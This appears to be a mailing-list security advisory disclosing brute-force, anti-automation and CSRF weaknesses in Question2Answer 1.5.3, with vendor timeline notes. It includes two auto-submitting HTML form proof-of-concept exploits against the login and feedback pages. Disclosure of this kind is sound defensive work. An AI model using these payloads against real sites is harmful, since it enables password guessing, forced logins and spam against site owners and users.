Hello list!

These are Brute Force, Insufficient Anti-automation and Cross-Site Request
Forgery vulnerabilities in Question2Answer. This is the first part of
vulnerabilities in this web application.

-------------------------
Affected products:
-------------------------

Vulnerable are all versions of Question2Answer (tested in version 1.5.3).

As developer informed me, in version Q2A 1.6 he's planning to add protection
against CSRF (see Timeline). And in January he has added this protection
into the last dev-version of Q2A
(http://www.question2answer.org/question2answer-dev-latest.zip). So before
official release of Q2A 1.6 people can use this dev-version.

Details:

Brute Force (WASC-11):

In login form (http://site/login) there is no protection from Brute Force
attacks.

Exploit:

<body onLoad="document.hack.submit()">
<form name="hack" action="http://site/login" method="post">
<input type="hidden" name="emailhandle" value="1">
<input type="hidden" name="password" value="1">
<input type="hidden" name="remember" value="1">
<input type="hidden" name="dologin" value="1">
</form>
</body>

Insufficient Anti-automation (WASC-21):

At contact page (http://site/feedback) there is no protection from automated
requests.

Exploit:

http://websecurity.com.ua/uploads/2013/Question2Answer%20IAA.html

<body onLoad="document.hack.submit()">
<form name="hack" action="http://site/feedback" method="post">
<input type="hidden" name="message" value="test">
<input type="hidden" name="name" value="test">
<input type="hidden" name="email" value="test">
<input type="hidden" name="dofeedback" value="1">
</form>
</body>

Cross-Site Request Forgery (WASC-09):

There is no protection against CSRF attacks in login (http://site/login) and
logout (http://site/logout) functionalities, and on other pages (there is no
protection against CSRF in the system at all). In the next advisory I'll
show example of CSRF, which allows to occupy admin account.

Lack of captcha in login form (http://site/login) can be used for different
attacks - for CSRF-attack to login into account (remote login - to conduct
attacks on vulnerabilities inside of account), for above-mentioned Brute
Force, for phishing and other automated attacks. Which you can read about in
the article "Attacks on unprotected login forms"
(http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-April/007773.html).
